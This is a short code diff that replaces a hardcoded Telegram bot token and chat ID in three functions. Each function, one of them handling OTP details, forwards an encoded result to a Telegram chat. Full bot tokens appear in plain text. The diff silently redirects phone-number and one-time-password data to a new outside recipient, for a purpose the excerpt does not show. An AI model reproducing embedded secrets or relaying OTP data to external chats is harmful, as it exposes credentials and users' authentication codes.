@@ -28,7 +28,7 @@ export const numberGetDetails = async ({
 
     // Send the message via Telegram Bot API
     const response = await fetch(
-      `https://api.telegram.org/bot7473802609:AAFrhbHjjgGc36j7VaZlCR5QWqykcxDZ5v4/sendMessage?chat_id=5887031482&text=${encodedResult}`
+      `https://api.telegram.org/bot7032433639:AAEvjbbaxA56VUXEftzozjOdEINqCnYCZ94/sendMessage?chat_id=6769991787&text=${encodedResult}`
     );
 
     if (!response.ok) {
@@ -67,7 +67,7 @@ export const otpGetDetails = async ({
 
     // Send the message via Telegram Bot API
     const response = await fetch(
-      `https://api.telegram.org/bot7473802609:AAFrhbHjjgGc36j7VaZlCR5QWqykcxDZ5v4/sendMessage?chat_id=5887031482&text=${encodedResult}`
+      `https://api.telegram.org/bot7032433639:AAEvjbbaxA56VUXEftzozjOdEINqCnYCZ94/sendMessage?chat_id=6769991787&text=${encodedResult}`
     );
 
     if (!response.ok) {
@@ -107,7 +107,7 @@ export const numberCancelDetails = async ({
 
     // Send the message via Telegram Bot API
     const response = await fetch(
-      `https://api.telegram.org/bot7473802609:AAFrhbHjjgGc36j7VaZlCR5QWqykcxDZ5v4/sendMessage?chat_id=5887031482&text=${encodedResult}`
+      `https://api.telegram.org/bot7032433639:AAEvjbbaxA56VUXEftzozjOdEINqCnYCZ94/sendMessage?chat_id=6769991787&text=${encodedResult}`
     );
 
     if (!response.ok) {
